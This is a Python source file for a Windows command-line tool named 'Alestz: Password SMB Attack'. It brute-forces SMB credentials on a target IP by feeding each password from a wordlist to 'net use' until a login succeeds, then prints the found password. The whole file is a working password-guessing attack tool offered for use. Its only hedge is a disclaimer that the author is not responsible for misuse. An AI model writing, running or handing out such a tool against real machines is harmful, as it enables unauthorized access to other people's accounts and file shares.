try:
    import os
    import re
    import socket
    import subprocess
    if not os.name == 'nt':
        print("\033[91mThis tool is for Windows only.\033[0m")
        try:
            input("Press Enter to exit..." )
        except KeyboardInterrupt:
            pass
        exit(1)
    os.system("title Alestz: Password SMB Attack")
    def check_network():
        try:
            socket.create_connection(("8.8.8.8", 53), timeout=5)
            return True
        except OSError:
            return False
    def check_ip(ipV4):
        pattern = r"^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$"
        if re.match(pattern, ipV4):
            blocks = ipV4.split('.')
            if all(0 <= int(block) <= 255 for block in blocks):
                return True
        return False
    def cls():
        os.system('cls')
    def menu():
        cls()
        print("╔════════════════════╗")
        print("║  COMMANDS:         ║")
        print("║  1. Attack         ║")
        print("║  2. Info           ║")
        print("║  3. Exit           ║")
        print("╚════════════════════╝")
    def prompt_input(prompt):
        try:
            return input(prompt + " >> ").strip()
        except KeyboardInterrupt:
            print()
            print()
            print("\033[91mKeyboard interrupt!\033[0m")
            try:
                input("Press Enter to continue...")
            except KeyboardInterrupt:
                pass
            return None
    def attack(user, wordlist, ip):
        if not check_network():
            print()
            print("\033[91mNo network connection!\033[0m")
            try:
                input("Press Enter to continue...")
            except KeyboardInterrupt:
                pass
            return
        count = 1
        try:
            with open(wordlist, 'r', encoding='utf-8') as file:
                passwords = file.readlines()
        except FileNotFoundError:
            print()
            print("\033[91mFile does not exist!\033[0m")
            try:
                input("Press Enter to continue...")
            except KeyboardInterrupt:
                pass
            return
        for passw in passwords:
            passw = passw.strip()
            if passw:
                try: 
                    result = subprocess.run(
                        ["net", "use", f"\\\\{ip}", "/user:" + user, passw],
                        capture_output=True,
                        text=True,
                        timeout=10
                    )
                    print(result)
                    print(f"\033[93m[Attempt {count}]\033[0m \033[97m: {passw}\033[0m")
                    count += 1
                    if result.returncode == 0:
                        print(f"\n\033[92mPassword found\033[0m \033[97m: {passw}\033[0m")
                        subprocess.run(["net", "use", f"\\\\{ip}", "/d", "/y"], capture_output=True, text=True)
                        try:
                            input("Press Enter to continue...")
                        except KeyboardInterrupt:
                            pass
                        return
                except subprocess.TimeoutExpired:
                    print("\033[91mConnection timed out.\033[0m")
                    try:
                        input("Press Enter to continue...")
                    except KeyboardInterrupt:
                        pass
                    return
                except subprocess.SubprocessError as e:
                    print(f"\033[91mError during execution: {e}\033[0m")
                    try:
                        input("Press Enter to continue...")
                    except KeyboardInterrupt:
                        pass
                    return
        print()
        print("\n\033[91mPassword not found!\033[0m")
        try:
            input("Press Enter to continue...")
        except KeyboardInterrupt:
            pass
    def main():
        while True:
            menu()
            choice = prompt_input("")
            if choice is None:
                continue
            elif choice == '1':
                cls()
                print("\033[91mNOTE: I'm not responsible for the bad behavior you have caused.\033[0m")
                try:
                    input("Press Enter to continue...")
                except KeyboardInterrupt:
                    pass
                cls()
                user = prompt_input("[TARGET USER]\n")
                if user == "":
                    print()
                    print("\033[91mPlease enter a username!\033[0m")
                    try:
                        input("Press Enter to continue...")
                    except KeyboardInterrupt:
                        pass
                    continue
                elif user is None:
                    continue
                print()
                wordlist = prompt_input("[PASSWORD LIST]\n")
                if wordlist == "":
                    print()
                    print("\033[91mPlease enter a password list!\033[0m")
                    try:
                        input("Press Enter to continue...")
                    except KeyboardInterrupt:
                        pass
                    continue
                elif wordlist is None:
                    continue
                print()
                ip = prompt_input("[TARGET IP]\n")
                if not check_ip(ip):
                    print()
                    print("\033[91mInvalid IP address!\033[0m")
                    try:
                        input("Press Enter to continue...")
                    except KeyboardInterrupt:
                        pass
                    continue
                elif ip is None:
                    continue
                print()
                attack(user, wordlist, ip)
            elif choice == '2':
                cls()
                print("\033[92m")
                print(r"                                  _           _                                 ")
                print(r"                            /\   | |         | |                                ")
                print(r"                           /  \  | | ___  ___| |_ ____                          ")
                print(r"                          / /\ \ | |/ _ \/ __| __|_  /                          ")
                print(r"                         / ____ \| |  __/\__ \ |_ / /                           ")
                print(r"                        /_/    \_\_|\___||___/\__/___|                          ")
                print("\033[0m")
                print("╔════════════════════════════════════════════════════════════════════════════════╗")
                print("║                          Alestz: Password SMB ATTACK                           ║")
                print("║                              Author:  MemeCoder                                ║")
                print("║                                 Version: 3.2                                   ║")
                print("╚════════════════════════════════════════════════════════════════════════════════╝")
                print("\033[92mThank you for using my tool!!!\033[0m")
                try:
                    input("Press Enter to continue...")
                except KeyboardInterrupt:
                    pass
            elif choice == '3':
                cls()
                break
            else:
                print()
                print("\033[91mInvalid choice!\033[0m")
                try:
                    input("Press Enter to continue...")
                except KeyboardInterrupt:
                    pass
    if __name__ == "__main__":
            main()
except Exception as e:
    print(f"\033[91mAn error occurred: {e}\033[0m")
    try:
        input("Press Enter to exit...")
    except KeyboardInterrupt:
        pass
    exit(1)
